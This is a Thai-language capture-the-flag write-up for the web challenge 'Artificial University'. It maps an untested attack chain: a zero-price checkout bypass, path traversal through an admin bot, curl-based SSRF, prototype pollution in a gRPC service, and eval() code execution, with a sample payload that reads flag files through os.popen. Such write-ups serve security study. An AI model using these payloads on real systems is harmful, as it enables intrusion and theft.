# Artificial University (Web, —)

**Flag:** ❌ ยังไม่พบ (ในไฟล์ที่แจกมาเป็น placeholder)
**สถานะ:** 🔴 วิเคราะห์โครงสร้างและ attack surface ไว้ (ยังไม่สำเร็จ)
**หมวดย่อย:** Web — Business Logic, Admin Bot, gRPC back-end, SSRF

---

## 📜 โจทย์

ระบบ "Artificial University" เป็นร้านค้าออนไลน์ที่ขายคอร์ส/สินค้า มี 2 service:

```text
Flask store (web)        → http://<host>:1337
gRPC product_api         → :50051  (backend ของ store)
```

สิ่งที่ให้มา:

- `src/store/` — Flask app (blueprints/routes.py, util/bot.py, util/payments.py, util/curl.py)
- `src/product_api/` — gRPC service (`api.py`, `product.proto`)
- `flag.txt` → `HTB{f4k3_fl4g_f0r_t35t1ng}` ← **placeholder**
- `entrypoint.sh` → `mv /flag.txt /flag$(cat /dev/urandom | tr -cd "a-f0-9" | head -c 10).txt`

👉 flag จริงถูก **เปลี่ยนชื่อเป็น `/flag<สุ่ม10ตัว>.txt`** ตอน container start
ดังนั้นต้องมี **arbitrary file read / RCE** เท่านั้นถึงจะได้ flag

---

## 🔍 Attack Surface ที่พบ

### 1. `/checkout` — Business Logic ที่ไม่ต้อง login

```python
@web.route("/checkout", methods=["GET"])
def checkout():
    product_id = request.args.get("product_id")
    price      = request.args.get("price")
    title      = request.args.get("title")
    user_id    = request.args.get("user_id")
    email      = request.args.get("email")

    if not product_id and (not price or not title or not user_id or not email):
        return ... "Missing external order details", 400

    if product_id:
        ...
    else:
        # สร้าง order จากค่าที่ผู้ใช้ส่งมาเองทั้งหมด
        payment_link, payment_id = generate_payment_link(int(price))
        order_id = db_session.create_order(title, user_id, email, int(price), payment_id)
```

- **ไม่ต้องล็อกอิน** ก็สร้าง order ได้ (ส่ง `price`/`title`/`user_id`/`email` มาเอง)
- `price` ถูก cast เป็น `int` และเอาไปใช้ต่อใน `/checkout/success`

### 2. `/checkout/success` — ช่องโหว่สำคัญ (price = 0)

```python
@web.route("/checkout/success", methods=["GET"])
def checkout_success():
    order_id   = request.args.get("order_id")
    payment_id = request.args.get("payment_id")

    order    = db_session.get_order(order_id)
    amt_paid = get_amount_paid(payment_id)      # dummy → return 0 เสมอ

    if amt_paid >= order.price:                 # ถ้า price = 0 → 0 >= 0 ผ่าน!
        db_session.mark_order_complete(order_id)
    else:
        return "Could not complete order", 401

    bot_runner(current_app.config["ADMIN_EMAIL"],
               current_app.config["ADMIN_PASS"], payment_id)   # ← admin bot ถูกเรียก
```

และใน `util/payments.py`:

```python
def get_amount_paid(payment_id):
    # Dummy implementation to get payment status
    return 0
```

**ผลลัพธ์:** สร้าง order ด้วย `price=0` → `amt_paid (0) >= order.price (0)` → **ผ่าน**
→ `bot_runner(...)` ถูกเรียกด้วย `payment_id` ที่เราควบคุม

### 3. Admin Bot — จุดที่ทำให้ chain สมบูรณ์

```python
def bot_runner(email, password, payment_id):
    client.get("http://127.0.0.1:1337/login")
    client.find_element(By.ID, "email").send_keys(email)          # admin email
    client.find_element(By.ID, "password").send_keys(password)    # admin password
    client.execute_script("document.getElementById('login-btn').click()")
    client.get(f"http://127.0.0.1:1337/static/invoices/invoice_{payment_id}.pdf")
```

- บอทล็อกอินเป็น **admin** ให้เราเสมอ
- แล้วเปิด URL: `/static/invoices/invoice_{payment_id}.pdf`
- `payment_id` มาจาก **query string ที่เราส่ง** (ไม่ใช่ค่าที่ generate จริง)

→ **Path traversal / URL injection**: เพราะ `payment_id` ถูกต่อเข้าไปใน URL ตรง ๆ
ถ้าใส่ค่าเช่น `../../admin/view-pdf?url=...` (หรือใช้ `#` ตัด `.pdf` ทิ้ง)
จะทำให้บอท (ในฐานะ admin) ไปเรียก endpoint ที่ admin เท่านั้นเข้าถึงได้

### 4. Endpoint ของ admin ที่เป็นเป้าหมาย

| Endpoint | อันตราย |
|---|---|
| `/admin/view-pdf?url=` | `requests.get(pdf_url)` → **SSRF** (ต้องมี `Content-Type: application/pdf`) |
| `/admin/api-health` | เรียก `curl -o /dev/null -w %{http_code} <url>` → **SSRF ผ่าน curl** (`file://`, `gopher://` ได้) |
| `/admin/save-product?product_dict=` | `ast.literal_eval(dict)` → ส่งเข้า gRPC `MarkProductSaved` |
| `/admin/product-stream` | เรียก gRPC `GetNewProducts()` แล้ว render product ทั้งหมด |

### 5. gRPC backend — `UpdateService` (Prototype Pollution)

```python
def UpdateService(self, source, destination):
    for key, value in source.items():
        if hasattr(destination, "__dict__") and key in destination.__dict__ and isinstance(value, dict):
            self.UpdateService(value, destination.__dict__[key])
        elif hasattr(destination, "__dict__"):
            destination.__dict__[key] = value          # ← เขียน attribute ตามใจผู้ใช้
        ...

def GenerateProduct(self):
    if hasattr(self, "price_formula"):
        price = eval(self.price_formula)               # ← eval()!
```

และ RPC ที่เปิดให้ใช้:

```proto
rpc DebugService(MergeRequest) returns (Empty);
message MergeRequest { map<string, InputValue> input = 1; }
```

👉 `DebugService` รับ dict จากผู้เรียก แล้ว merge เข้า object ของ service
→ ถ้าส่ง `price_formula = "__import__('os').popen('cat /flag*').read()"` เข้าไป
จะทำให้ `GenerateProduct()` เรียก **`eval()` ที่รันโค้ดได้** (RCE ในฝั่ง gRPC)

> ค่าที่ `eval` คืนต้องเป็นตัวเลข (เพราะเป็น `price`) — เลขที่ได้จาก `int(...)` หรือ
> ให้เขียน flag ลง output ก่อนแล้วค่อย `return 1`

### 6. ลำดับการโจมตีที่เป็นไปได้ (สมมติฐาน)

```text
1. register/login ผู้ใช้ปกติ
2. /checkout?price=0&title=x&user_id=1&email=a@b.c   → ได้ order_id + payment_id
3. /checkout/success?order_id=<>&payment_id=<payload> → ผ่าน (0 >= 0) + เรียก admin bot
4. payment_id = "../../admin/api-health?url=..."      → bot (admin) ยิง SSRF
   หรือ payment_id = "../../admin/save-product?product_dict=..." → เขียน price_formula ผ่าน gRPC
5. gRPC DebugService → ตั้ง price_formula = RCE → cat /flag*.txt
6. flag ออกทางหน้า product stream / saved products
```

**หมายเหตุ:** ขั้นตอนที่ 4–5 ยังไม่ได้ทดสอบกับ server จริง (ในไฟล์ที่แจกเป็น placeholder)

---

## 🧠 หลักการที่ต้องเข้าใจ

| แนวคิด | คำอธิบาย |
|---|---|
| **Business logic: price = 0** | `amt_paid >= price` เป็นการเทียบที่ถูก bypass ได้ด้วย 0 (และไม่มี check `price > 0`) |
| **Trust in URL parameter** | `payment_id` ถูกใช้ต่อใน URL ของ bot โดยไม่ validate → path traversal / URL injection |
| **Admin bot** | แพทเทิร์นมาตรฐาน: bot มีสิทธิ์สูง + เปิด URL ที่ผู้เล่นควบคุม = ยกระดับสิทธิ์ |
| **SSRF ผ่าน curl/requests** | ต่างกันที่ `curl` รองรับ scheme มากกว่า (`file://`, `gopher://`, `dict://`) |
| **Prototype pollution ฝั่ง gRPC** | `destination.__dict__[key] = value` เขียน attribute ได้ตามใจ → ตั้ง `price_formula` เพื่อไปชน `eval()` |
| **`eval()` = RCE** | ปัญหาคลาสสิกที่สุดใน Python |

## ✅ สรุป

โจทย์นี้เป็น **chain ยาว** ที่ผูก 4 ช่องโหว่เข้าด้วยกัน:

```text
Business Logic (price=0)
      → Admin Bot ถูกเรียก
      → Path traversal ใน payment_id (ทำให้ bot ยิง endpoint admin)
      → gRPC Prototype Pollution (ตั้ง price_formula)
      → eval() = RCE
      → cat /flag<random>.txt
```

สถานะปัจจุบัน: **วิเคราะห์โครงสร้างครบแล้ว แต่ยังไม่ได้ทดสอบกับ instance จริง**
(ไฟล์ `flag.txt` ที่แจกมาเป็น `HTB{f4k3_fl4g_f0r_t35t1ng}` ซึ่งไม่ใช่ flag จริง)
